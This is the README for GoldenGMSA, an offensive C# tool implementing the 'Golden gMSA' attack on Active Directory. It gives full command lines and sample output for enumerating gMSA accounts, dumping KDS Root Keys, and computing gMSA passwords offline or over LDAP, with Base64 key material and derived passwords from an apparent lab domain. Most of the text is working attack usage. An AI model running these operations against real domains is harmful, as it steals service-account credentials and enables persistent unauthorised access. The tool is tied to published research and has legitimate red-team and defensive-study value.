# GoldenGMSA

GoldenGMSA is a C# tool for abusing Group Managed Service Accounts (gMSA) in Active Directory.

This tool is based on research by Yuval Gordon ([@YuG0rd](https://twitter.com/YuG0rd)).

More details are available at the post [Introducing the Golden GMSA Attack](https://www.semperis.com/blog/golden-gmsa-attack/).

## Usage

![image](images/usage.png)

### Query gMSAs in the domain (gmsainfo):

This operation enumerates gMSAs in the domain and lists their name, SID, associated KDS Root Key, and a Base64 encoded blob that represents their msds-ManagedPasswordID.

 - `-s, --sid`:    The SID of the gMSA account to query (optional)

This operation does not require high privileges.

Example #1 - Enumerate all gMSAs:

    C:\Users\administrator\Desktop>GoldenGMSA.exe gmsainfo

    SamAccountName:         gmsa1$
    ObjectSID:              S-1-5-21-1437000690-1664695696-1586295871-1112
    RootKeyGuid:            46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb  
    msds-ManagedPasswordID: AQAAAEtEU0sCAAAAaAEAABAAAAADAAAAubjlRlfK5gHoufuyZ+St6wAAAAAiAAAAIgAAAHMAaABlAG4AYQBuAGkAZwBhAG4AcwAuAGwAYQBiAHMAAABzAGgAZQBuAGEAbgBpAGcAYQBuAHMALgBsAGEAYgBzAAAA
    
    ----------------------------------------------
    
    SamAccountName:         gmsa2$
    ObjectSID:              S-1-5-21-1437000690-1664695696-1586295871-1113
    RootKeyGuid:            46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb   
    msds-ManagedPasswordID: AQAAAEtEU0sCAAAAaAEAABAAAAADAAAAubjlRlfK5gHoufuyZ+St6wAAAAAiAAAAIgAAAHMAaABlAG4AYQBuAGkAZwBhAG4AcwAuAGwAYQBiAHMAAABzAGgAZQBuAGEAbgBpAGcAYQBuAHMALgBsAGEAYgBzAAAA
    
    ----------------------------------------------

Example #2 - Query for specific gMSA:

    C:\Users\administrator\Desktop>GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112
    
    SamAccountName:         gmsa1$
    ObjectSID:              S-1-5-21-1437000690-1664695696-1586295871-1112
    RootKeyGuid:            46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb    
    msds-ManagedPasswordID: AQAAAEtEU0sCAAAAaAEAABAAAAADAAAAubjlRlfK5gHoufuyZ+St6wAAAAAiAAAAIgAAAHMAaABlAG4AYQBuAGkAZwBhAG4AcwAuAGwAYQBiAHMAAABzAGgAZQBuAGEAbgBpAGcAYQBuAHMALgBsAGEAYgBzAAAA
    
    ----------------------------------------------

### Query KDS Root Keys (kdsinfo)

This operation dumps a single KDS Root Key to be used for gMSA password generation. 

The output is a Based64 encoded blob that represents the KDS Root Key.

 - `--guid <KDS Root Key Guid>`:    The GUID of the KDS Root Key object (optional)

**This operation requires high privileges.**

Example #1 - Query specific KDS Root Key: 

    C:\Users\administrator\Desktop>GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
    
    Guid:   46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
    Base64: AQAAALm45UZXyuYB6Ln7smfkresAAAAAAQAAAAAAAAAkAAAAUwBQADgAMAAwAF8AMQAwADgAXwBDAFQAUgBfAEgATQBBAEMAHgAAAAAAAAABAAAADgAAAAAAAABTAEgAQQA1ADEAMgAAAAAAAAAEAAAARABIAAwCAAAMAgAAREhQTQABAACHqOYdtLZmPP+70ZxlGVmZjO72CGYN0PJdLO7UQ147AOAN+PHWGVfU+vffRWGyqjAWw9kRNAlvqjv0KW2DDpp8IJ4MZJdRer1aip0wa89n7ZH55nJbR1jAIuCx70J1v3tsW/wR1F+QiLlB9U6x5Zu4vDmgvxIwf1xP23DFgbI/drY6yuHKpreQLVJSZzVIig7xPG2aUb+kqzrYNHeWUk2O9qFntaQYJdln4UTlFAVkJRzKy4PmtIb2s8o/eXFQYCbAuFf2iZYoVt7UAQq9C+Yhw6OWClTnEMN18mN11wFBA6S1QzDBmK8SYRbSJ24RcV9pOHf61+8JytsJSukeGhWXP7Msm3MTTQsud1BmYO29SEynsY8h7yBUB/R5OhoLoSUQ28FQd75GP/9P7UqsC7VVvjpsGwxrR7G8N3O/foxvYpASKPjCjLsYpVrjE0EACmUBlvkxx3pX8t30Y+Xp7BRLd33mKqq4qGKKw3bSgtbtOGTmeYJCjryDHRQ0j28vkZO1BFrydnFk4d/JZ8H7Py5VpL0b/+g7nIDQUrmF0YLqCtsqO3MT0/4UyEhLHgUliLm30rvS3wFhmezQbhVXzQkVszU7u2Tg7Dd/0Cg3DfkrUseJFCjNxn62GEtSPR2yRsMvYweEkPAO+NZH0UjUeVRRXiMnz++YxYJmS0wPbMQWWQACAAAACAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAGYAAABDAE4APQBEAEMAMQAsAE8AVQA9AEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzACwARABDAD0AcwBoAGUAbgBhAG4AaQBnAGEAbgBzACwARABDAD0AbABhAGIAcwAw2JwZByTYAd4g7EezI9gBAAAAAAAAAABAAAAAAAAAAMn65paJq+hm1H2aXngbqY9HR5PVxR49PTzGG0XyiK8yqMABBrnHRDigfbXtD3OehGNuXVRWSE70SM0R7djG2/M=

Example #2 - Query for all KDS Root Keys: 

    C:\Users\administrator\Desktop>GoldenGMSA.exe kdsinfo
    
    Guid:   46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
    Base64: AQAAALm45UZXyuYB6Ln7smfkresAAAAAAQAAAAAAAAAkAAAAUwBQADgAMAAwAF8AMQAwADgAXwBDAFQAUgBfAEgATQBBAEMAHgAAAAAAAAABAAAADgAAAAAAAABTAEgAQQA1ADEAMgAAAAAAAAAEAAAARABIAAwCAAAMAgAAREhQTQABAACHqOYdtLZmPP+70ZxlGVmZjO72CGYN0PJdLO7UQ147AOAN+PHWGVfU+vffRWGyqjAWw9kRNAlvqjv0KW2DDpp8IJ4MZJdRer1aip0wa89n7ZH55nJbR1jAIuCx70J1v3tsW/wR1F+QiLlB9U6x5Zu4vDmgvxIwf1xP23DFgbI/drY6yuHKpreQLVJSZzVIig7xPG2aUb+kqzrYNHeWUk2O9qFntaQYJdln4UTlFAVkJRzKy4PmtIb2s8o/eXFQYCbAuFf2iZYoVt7UAQq9C+Yhw6OWClTnEMN18mN11wFBA6S1QzDBmK8SYRbSJ24RcV9pOHf61+8JytsJSukeGhWXP7Msm3MTTQsud1BmYO29SEynsY8h7yBUB/R5OhoLoSUQ28FQd75GP/9P7UqsC7VVvjpsGwxrR7G8N3O/foxvYpASKPjCjLsYpVrjE0EACmUBlvkxx3pX8t30Y+Xp7BRLd33mKqq4qGKKw3bSgtbtOGTmeYJCjryDHRQ0j28vkZO1BFrydnFk4d/JZ8H7Py5VpL0b/+g7nIDQUrmF0YLqCtsqO3MT0/4UyEhLHgUliLm30rvS3wFhmezQbhVXzQkVszU7u2Tg7Dd/0Cg3DfkrUseJFCjNxn62GEtSPR2yRsMvYweEkPAO+NZH0UjUeVRRXiMnz++YxYJmS0wPbMQWWQACAAAACAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAGYAAABDAE4APQBEAEMAMQAsAE8AVQA9AEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzACwARABDAD0AcwBoAGUAbgBhAG4AaQBnAGEAbgBzACwARABDAD0AbABhAGIAcwAw2JwZByTYAd4g7EezI9gBAAAAAAAAAABAAAAAAAAAAMn65paJq+hm1H2aXngbqY9HR5PVxR49PTzGG0XyiK8yqMABBrnHRDigfbXtD3OehGNuXVRWSE70SM0R7djG2/M=
    ----------------------------------------------
    Guid:   3df3e77d-161d-69e3-3f7b-68d513f197db
    Base64: AQAAADB25ZCyBX8BEYhXd/PM/jEAAAAAAQAAAAAAAAAkAAAAUwBQADgAMAAwAF8AMQAwADgAXwBDAFQAUgBfAEgATQBBAEMAHgAAAAAAAAABAAAADgAAAAAAAABTAEgAQQA1ADEAMgAAAAAAAAAEAAAARABIAAwCAAAMAgAAREhQTQABAACHqOYdtLZmPP+70ZxlGVmZjO72CGYN0PJdLO7UQ147AOAN+PHWGVfU+vffRWGyqjAWw9kRNAlvqjv0KW2DDpp8IJ4MZJdRer1aip0wa89n7ZH55nJbR1jAIuCx70J1v3tsW/wR1F+QiLlB9U6x5Zu4vDmgvxIwf1xP23DFgbI/drY6yuHKpreQLVJSZzVIig7xPG2aUb+kqzrYNHeWUk2O9qFntaQYJdln4UTlFAVkJRzKy4PmtIb2s8o/eXFQYCbAuFf2iZYoVt7UAQq9C+Yhw6OWClTnEMN18mN11wFBA6S1QzDBmK8SYRbSJ24RcV9pOHf61+8JytsJSukeGhWXP7Msm3MTTQsud1BmYO29SEynsY8h7yBUB/R5OhoLoSUQ28FQd75GP/9P7UqsC7VVvjpsGwxrR7G8N3O/foxvYpASKPjCjLsYpVrjE0EACmUBlvkxx3pX8t30Y+Xp7BRLd33mKqq4qGKKw3bSgtbtOGTmeYJCjryDHRQ0j28vkZO1BFrydnFk4d/JZ8H7Py5VpL0b/+g7nIDQUrmF0YLqCtsqO3MT0/4UyEhLHgUliLm30rvS3wFhmezQbhVXzQkVszU7u2Tg7Dd/0Cg3DfkrUseJFCjNxn62GEtSPR2yRsMvYweEkPAO+NZH0UjUeVRRXiMnz++YxYJmS0wPbMQWWQACAAAACAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAG4AAABDAE4APQBTAE0AUABSAFMARABDADAAMQAsAE8AVQA9AEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzACwARABDAD0AcwBlAG0AcABlAHIAaQBzACwARABDAD0AbABvAGMAYQBsAFA/Kk8tJ9gBbuEqfdkm2AEAAAAAAAAAAEAAAAAAAAAAYx9Wlu0MlW9kQv27PWr9HRW46rDu6cwOI+of9DvCBDd621MGT5xjdmI24ORuiJnUxHhMQAelkvwo96vANAiCxQ==        
    ----------------------------------------------

### Compute gMSA password (compute)

This operation computes the gMSA password using a KDS Root Key and the gMSA's attributes rather than reading the msDS-ManagedPassword attribute.

The output is the Base64-encoded gMSA password.

- `--sid <gMSA SID>`:               SID of the gMSA (required)
- `--kdskey <Base64-encoded blob>`: Base64 encoded KDS Root Key
- `--pwdid <Base64-encoded blob>`:  Base64 of msds-ManagedPasswordID attribute value

#### Lazy mode (requires privileged access to the domain)

If the gMSA's SID is the only argument provided, the tool locates the specified gMSA, reads the associated KDS Root Key, and then computes the gMSA password.
**This mode requires high privileges.**

- `--sid <gMSA SID>`: SID of the target gMSA.

Example:

    C:\Users\administrator\Desktop>GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112
    
    ZSWQIz5mLbEcw6mm8J49DWCADxDT703UPFLbRftDTqE7WzAfmd7mQt75o1ZvIpTqGo5okZycD2rZgBdVu9wbTxIQL6H4hbAcODW43Yv0tXxo0IYajhCiyrJ7Vvchs4dWUtCED/0pOdStxG2H7dSriLgoN62YJushjRIkHGQvK4E5zPvu5dREepOCDuhAE6F1mo33kKtpo7fWvlNgQgYNIvCYqtv4PnYzNkRZYqbMZwhocjkMRFq9WzA5YzYZwj5wgeBmi7Fl2bcm7139AIAIZgUs1XaMEPXnjlFGizH8ry9b9iOsv6YaHWBtktm5ECSVcHGHpLISVk7Rzn2tRvljew==

#### Domain user mode (requires LDAP access)
If the KDS Root Key is provided, but the gMSA's msds-ManagedPasswordID blob is not, the tool retrieves the attribute using LDAP, and then computes the gMSA password. A low-privileged domain user and LDAP connectivity are required.

- `--sid <gmsaSID>`:                Sets the SID of the target gMSA.
- `--kdskey <Base64 encoded blob>`: Base64-encoded KDS Root Key.

Example:

    C:\Users\administrator\Desktop>GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB6Ln7smfkresAAAAAAQAAAAAAAAAkAAAAUwBQADgAMAAwAF8AMQAwADgAXwBDAFQAUgBfAEgATQBBAEMAHgAAAAAAAAABAAAADgAAAAAAAABTAEgAQQA1ADEAMgAAAAAAAAAEAAAARABIAAwCAAAMAgAAREhQTQABAACHqOYdtLZmPP+70ZxlGVmZjO72CGYN0PJdLO7UQ147AOAN+PHWGVfU+vffRWGyqjAWw9kRNAlvqjv0KW2DDpp8IJ4MZJdRer1aip0wa89n7ZH55nJbR1jAIuCx70J1v3tsW/wR1F+QiLlB9U6x5Zu4vDmgvxIwf1xP23DFgbI/drY6yuHKpreQLVJSZzVIig7xPG2aUb+kqzrYNHeWUk2O9qFntaQYJdln4UTlFAVkJRzKy4PmtIb2s8o/eXFQYCbAuFf2iZYoVt7UAQq9C+Yhw6OWClTnEMN18mN11wFBA6S1QzDBmK8SYRbSJ24RcV9pOHf61+8JytsJSukeGhWXP7Msm3MTTQsud1BmYO29SEynsY8h7yBUB/R5OhoLoSUQ28FQd75GP/9P7UqsC7VVvjpsGwxrR7G8N3O/foxvYpASKPjCjLsYpVrjE0EACmUBlvkxx3pX8t30Y+Xp7BRLd33mKqq4qGKKw3bSgtbtOGTmeYJCjryDHRQ0j28vkZO1BFrydnFk4d/JZ8H7Py5VpL0b/+g7nIDQUrmF0YLqCtsqO3MT0/4UyEhLHgUliLm30rvS3wFhmezQbhVXzQkVszU7u2Tg7Dd/0Cg3DfkrUseJFCjNxn62GEtSPR2yRsMvYweEkPAO+NZH0UjUeVRRXiMnz++YxYJmS0wPbMQWWQACAAAACAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAGYAAABDAE4APQBEAEMAMQAsAE8AVQA9AEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzACwARABDAD0AcwBoAGUAbgBhAG4AaQBnAGEAbgBzACwARABDAD0AbABhAGIAcwAw2JwZByTYAd4g7EezI9gBAAAAAAAAAABAAAAAAAAAAMn65paJq+hm1H2aXngbqY9HR5PVxR49PTzGG0XyiK8yqMABBrnHRDigfbXtD3OehGNuXVRWSE70SM0R7djG2/M=
    
    ZSWQIz5mLbEcw6mm8J49DWCADxDT703UPFLbRftDTqE7WzAfmd7mQt75o1ZvIpTqGo5okZycD2rZgBdVu9wbTxIQL6H4hbAcODW43Yv0tXxo0IYajhCiyrJ7Vvchs4dWUtCED/0pOdStxG2H7dSriLgoN62YJushjRIkHGQvK4E5zPvu5dREepOCDuhAE6F1mo33kKtpo7fWvlNgQgYNIvCYqtv4PnYzNkRZYqbMZwhocjkMRFq9WzA5YzYZwj5wgeBmi7Fl2bcm7139AIAIZgUs1XaMEPXnjlFGizH8ry9b9iOsv6YaHWBtktm5ECSVcHGHpLISVk7Rzn2tRvljew==

#### Offline mode

If all the required infomration is provided, the tool generates the password completely offline.

- `--sid <gmsaSID>`:                Sets the SID of the target gMSA.
- `--kdskey <Base64 encoded blob>`: Base64-encoded KDS Root Key.
- `--pwdid <Base64 encoded blob>`:  Base64-encoded msds-ManagedPasswordID attribute of the target gMSA.

Example:

    C:\Users\administrator\Desktop>GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB6Ln7smfkresAAAAAAQAAAAAAAAAkAAAAUwBQADgAMAAwAF8AMQAwADgAXwBDAFQAUgBfAEgATQBBAEMAHgAAAAAAAAABAAAADgAAAAAAAABTAEgAQQA1ADEAMgAAAAAAAAAEAAAARABIAAwCAAAMAgAAREhQTQABAACHqOYdtLZmPP+70ZxlGVmZjO72CGYN0PJdLO7UQ147AOAN+PHWGVfU+vffRWGyqjAWw9kRNAlvqjv0KW2DDpp8IJ4MZJdRer1aip0wa89n7ZH55nJbR1jAIuCx70J1v3tsW/wR1F+QiLlB9U6x5Zu4vDmgvxIwf1xP23DFgbI/drY6yuHKpreQLVJSZzVIig7xPG2aUb+kqzrYNHeWUk2O9qFntaQYJdln4UTlFAVkJRzKy4PmtIb2s8o/eXFQYCbAuFf2iZYoVt7UAQq9C+Yhw6OWClTnEMN18mN11wFBA6S1QzDBmK8SYRbSJ24RcV9pOHf61+8JytsJSukeGhWXP7Msm3MTTQsud1BmYO29SEynsY8h7yBUB/R5OhoLoSUQ28FQd75GP/9P7UqsC7VVvjpsGwxrR7G8N3O/foxvYpASKPjCjLsYpVrjE0EACmUBlvkxx3pX8t30Y+Xp7BRLd33mKqq4qGKKw3bSgtbtOGTmeYJCjryDHRQ0j28vkZO1BFrydnFk4d/JZ8H7Py5VpL0b/+g7nIDQUrmF0YLqCtsqO3MT0/4UyEhLHgUliLm30rvS3wFhmezQbhVXzQkVszU7u2Tg7Dd/0Cg3DfkrUseJFCjNxn62GEtSPR2yRsMvYweEkPAO+NZH0UjUeVRRXiMnz++YxYJmS0wPbMQWWQACAAAACAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAGYAAABDAE4APQBEAEMAMQAsAE8AVQA9AEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzACwARABDAD0AcwBoAGUAbgBhAG4AaQBnAGEAbgBzACwARABDAD0AbABhAGIAcwAw2JwZByTYAd4g7EezI9gBAAAAAAAAAABAAAAAAAAAAMn65paJq+hm1H2aXngbqY9HR5PVxR49PTzGG0XyiK8yqMABBrnHRDigfbXtD3OehGNuXVRWSE70SM0R7djG2/M= --pwdid AQAAAEtEU0sCAAAAaAEAABAAAAADAAAAubjlRlfK5gHoufuyZ+St6wAAAAAiAAAAIgAAAHMAaABlAG4AYQBuAGkAZwBhAG4AcwAuAGwAYQBiAHMAAABzAGgAZQBuAGEAbgBpAGcAYQBuAHMALgBsAGEAYgBzAAAA
    
    ZSWQIz5mLbEcw6mm8J49DWCADxDT703UPFLbRftDTqE7WzAfmd7mQt75o1ZvIpTqGo5okZycD2rZgBdVu9wbTxIQL6H4hbAcODW43Yv0tXxo0IYajhCiyrJ7Vvchs4dWUtCED/0pOdStxG2H7dSriLgoN62YJushjRIkHGQvK4E5zPvu5dREepOCDuhAE6F1mo33kKtpo7fWvlNgQgYNIvCYqtv4PnYzNkRZYqbMZwhocjkMRFq9WzA5YzYZwj5wgeBmi7Fl2bcm7139AIAIZgUs1XaMEPXnjlFGizH8ry9b9iOsv6YaHWBtktm5ECSVcHGHpLISVk7Rzn2tRvljew==

## References
 - https://www.semperis.com/blog/golden-gmsa-attack/
